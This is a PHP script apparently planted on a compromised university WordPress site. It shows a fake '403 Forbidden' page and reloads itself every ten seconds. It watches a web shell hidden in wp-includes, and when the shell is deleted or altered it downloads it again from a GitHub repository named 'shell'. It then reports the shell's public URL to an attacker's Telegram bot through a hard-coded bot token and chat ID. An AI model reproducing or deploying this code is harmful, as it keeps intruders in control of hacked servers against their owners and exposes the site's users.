<?php
$botToken   = "8219840842:AAGFPfxFZN-5P3066WbKRZ9X-bv5zWQDYRs";
$chatId     = "-1002996607823";
$siteLabel  = "https://plk.unair.ac.id/";

$watchFiles = [
    "/home/plkunair/public_html/wp-includes/SimplePie/src/Parse/kontol.php"
        => "https://raw.githubusercontent.com/guabantai/shell/refs/heads/main/re.php",

];

$publicDir   = "/home/plkunair/public_html/";
$logFile     = __DIR__ . "/watcher_filelog.json";
$refreshTime = 10;

echo "<meta http-equiv='refresh' content='$refreshTime'>";
echo "<h2>403 Forbidden</h2>";

if (file_exists($logFile)) {
    $lastState = json_decode(file_get_contents($logFile), true);
    $firstRun  = false;
} else {
    $lastState = [];
    $firstRun  = true;
}

$currentState = [];
foreach ($watchFiles as $file => $srcUrl) {
    if (file_exists($file)) {
        $currentState[$file] = [
            "size" => filesize($file),
            "hash" => md5_file($file)
        ];
    }
}

if (!$firstRun) {
    $deleted = array_diff_key($lastState, $currentState);

    foreach ($deleted as $f => $info) {
        sendNotif("‚ùå [$siteLabel] File hilang: $f");
        if (isset($watchFiles[$f])) {
            restoreFileSamePath($f, $watchFiles[$f], $publicDir);
        }
    }

    foreach ($currentState as $f => $info) {
        if (isset($lastState[$f]) && $lastState[$f]["hash"] !== $info["hash"]) {
            sendNotif("‚ö†Ô∏è [$siteLabel] File berubah: $f ‚Üí auto-restore...");
            restoreFileSamePath($f, $watchFiles[$f], $publicDir);
        }
    }
} else {
    echo "üîÑ First run: baseline dibuat, belum ada notif.<br>";
}

file_put_contents($logFile, json_encode($currentState, JSON_PRETTY_PRINT));


function restoreFileSamePath($path, $url, $publicDir) {
    global $siteLabel;

    $dir = dirname($path);
    if (!is_dir($dir)) {
        mkdir($dir, 0755, true);
    }

    $filename = basename($path);
    $data = @file_get_contents($url);

    if ($data !== false) {
        file_put_contents($path, $data);

        $relativePath = str_replace($publicDir, '', $path);
        $publicUrl = rtrim($siteLabel, '/') . $relativePath;

        sendNotif("‚ôªÔ∏è [$siteLabel] File dipulihkan!\nNama : $filename\nLokasi : $path\nURL : $publicUrl\nSource : $url");

        echo "Restore OK: $path<br>";
    } else {
        sendNotif("‚ö†Ô∏è [$siteLabel] Gagal memulihkan file: $path\nSource : $url");
        echo "Restore Gagal: $path<br>";
    }
}

function sendNotif($msg) {
    global $botToken, $chatId;
    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $data = ["chat_id" => $chatId, "text" => $msg];
    @file_get_contents($url . "?" . http_build_query($data));
}
